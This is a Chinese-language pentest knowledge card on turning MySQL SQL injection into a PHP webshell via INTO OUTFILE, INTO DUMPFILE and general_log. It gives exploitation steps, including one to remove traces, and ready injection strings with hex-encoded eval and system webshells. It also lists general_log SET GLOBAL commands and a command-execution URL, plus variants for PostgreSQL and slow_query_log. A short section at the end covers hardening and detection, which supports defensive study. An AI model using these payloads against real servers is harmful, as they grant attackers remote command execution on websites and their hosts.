---
id: web-generic-sqli-mysql-outfile-general-log-webshell
title: MySQL SQL 注入写 WebShell：INTO OUTFILE、DUMPFILE 与 general_log 落盘
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-mysql-file-write-webshell
aliases:
- MySQL INTO OUTFILE 写马
- SQL 注入写 shell
- general_log 写 webshell
- DUMPFILE 写文件
- MySQL FILE 权限利用
tags:
- sqli
- mysql
- webshell
- into-outfile
- dumpfile
- general-log
- file-write
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:15:33+08:00'
  notes: 原文无图片，已核对写马链：FILE 权限 + secure_file_priv 允许 + Web 目录可写时，UNION SELECT ... INTO OUTFILE/DUMPFILE 写入六进制 PHP；general_log_file 改到 Web 目录并开启 general_log 可把查询原文写入 shell.php，需 SUPER/SYSTEM_VARIABLES_ADMIN；OUTFILE 不覆盖已有文件、DUMPFILE 单行无转义的说明正确。原文未涉及版本区间。未执行 PoC。
---

## 一句话结论

当 SQL 注入账号具备 `FILE` 权限、`secure_file_priv` 允许写入且已知 Web 根目录可写时，可用 `UNION SELECT ... INTO OUTFILE`/`INTO DUMPFILE` 把 PHP 代码写成 WebShell；若 `OUTFILE` 被限制，还可把 `general_log_file` 改到 Web 目录并开启 `general_log`，让 MySQL 把包含 PHP 代码的查询语句写入日志文件，形成 WebShell。

## 原理

- MySQL 的 `FILE` 权限允许用户读写服务器文件。`SELECT ... INTO OUTFILE 'path'` 会把查询结果按行写入文件；`SELECT ... INTO DUMPFILE 'path'` 把单行内容原样写入、不做转义，适合二进制或需要精确控制的内容。
- 写 WebShell 需要同时满足：当前数据库用户有 `FILE` 权限；`secure_file_priv` 为空或包含目标目录；目标目录对 mysqld 运行用户可写；知道 Web 根目录的绝对路径；注入点能执行 `UNION SELECT` 或堆叠语句，且列数匹配。
- `INTO OUTFILE` 不会覆盖已存在文件，且会对换行、制表符等做转义；常用十六进制字符串（`0x3c3f...`）避免引号和转义问题。
- `general_log` 是 MySQL 的通用查询日志。`general_log_file` 可指向任意可写路径；开启后，MySQL 会把收到的每条查询原文写入该文件。攻击者执行一条内容为 `SELECT '<?php ...?>'` 的查询，PHP 代码就会以明文出现在日志文件中，再用 Web 访问该文件即可执行。
- `general_log` 路径依赖 `SUPER`/`SYSTEM_VARIABLES_ADMIN` 权限；日志文件由 mysqld 创建，权限通常可被 Web 服务器读取，但不一定可被 Web 服务器用户写入。

## 触发条件

- 存在 SQL 注入，且能执行 `UNION SELECT`（或支持堆叠语句）。
- MySQL 账号有 `FILE` 权限；`secure_file_priv` 为空或指向可利用目录（`SHOW VARIABLES LIKE 'secure_file_priv'`）。
- 已知 Web 根目录绝对路径，且 mysqld 对目标目录有写权限；数据库与 Web 同机（或挂载共享目录）。
- 目标 Web 服务器会解析写入的后缀（`.php` 等），且 WAF 不拦截 `INTO OUTFILE`/`general_log`。
- `general_log` 方案还需要修改全局变量的权限。

## 利用步骤

1. 判断权限与路径：
   - `SELECT @@version;`
   - `SHOW VARIABLES LIKE 'secure_file_priv';`
   - `SELECT @@basedir, @@datadir;`
   - 尝试 `SELECT ... INTO OUTFILE '/tmp/test.txt'` 验证写权限。
2. 获取 Web 根目录：报错、`@@basedir`、常见路径猜测（`/var/www/html/`、`/usr/share/nginx/html/`、`C:/inetpub/wwwroot/`）。
3. 计算原查询列数，构造 `UNION SELECT`，把 WebShell 代码作为某一列。
4. 用十六进制编码或 `CHAR()` 避免引号被过滤。
5. 写入后访问文件验证执行；若 `OUTFILE` 失败，改用 `general_log`。
6. 写入成功后删除临时文件/关闭日志，减少痕迹。

## PoC

MySQL `INTO OUTFILE`（列数需匹配，示例为 2 列）：

```sql
?id=1' UNION SELECT 1, 0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e INTO OUTFILE '/var/www/html/shell.php'-- -
```

其中 `0x3c3f...` 是 `<?php eval($_POST[cmd]);?>` 的十六进制。

`INTO DUMPFILE`（单行、无转义）：

```sql
?id=1' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e INTO DUMPFILE '/var/www/html/shell.php'-- -
```

`general_log` 方案：

```sql
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SET GLOBAL general_log = 'ON';
SELECT '<?php system($_GET["cmd"]); ?>';
```

然后访问 `http://target/shell.php?cmd=id`。

说明：

- `INTO OUTFILE` 不能覆盖已有文件；目标文件已存在时先换文件名或删除。
- 若 `secure_file_priv` 指向固定目录，只能写入该目录，需结合目录穿越/软链接/Web 目录映射。
- `general_log` 会把后续所有查询写入该文件，文件会持续增大；验证后应关闭。
- 若注入点不支持 `UNION`，可尝试堆叠查询或报错注入配合其他写文件原语。

## 变体与关联

- 变体：PostgreSQL 可用 `COPY (SELECT '<?php ...?>') TO '/var/www/html/shell.php';`，需要 `superuser` 或相应权限，且路径必须是数据库服务器可写。
- 变体：SQL Server 用 `xp_cmdshell`/`sp_OACreate` 执行 `echo` 写文件，见关联卡。
- 变体：`slow_query_log` 同样可把查询写入指定文件，条件与 `general_log` 类似。
- 关联：[[web-generic-sqli-mssql-stacked-xp-cmdshell]]（SQL Server 的命令执行与写文件）。
- 关联：[[pentest-privilege-escalation-mysql-udf-dumpfile-root]]（用 `DUMPFILE` 写 UDF 共享库提权）。
- 边界：无 `FILE` 权限、`secure_file_priv=NULL`、Web 与数据库分离且无共享目录、目标目录不可写时，本手法失效。

## 检测与防御

- 修复：数据库账号最小权限，业务账号不授予 `FILE`、`SUPER`、`SYSTEM_VARIABLES_ADMIN`；SQL 全部参数化。
- 加固：`secure_file_priv` 设为固定目录或 `NULL`；关闭 `general_log`/`slow_query_log` 或把日志写到数据库专用目录；Web 根目录禁止数据库用户写入。
- 加固：数据库与 Web 分离部署，避免共享可写目录；Web 目录禁止脚本写入，上传目录不解析脚本。
- 检测：SQL 日志中出现 `INTO OUTFILE`、`INTO DUMPFILE`、`general_log_file`、`SET GLOBAL general_log`；Web 目录新增 `.php`/`.jsp` 文件；mysqld 进程写 Web 目录；数据库账号执行异常 `UNION SELECT`。
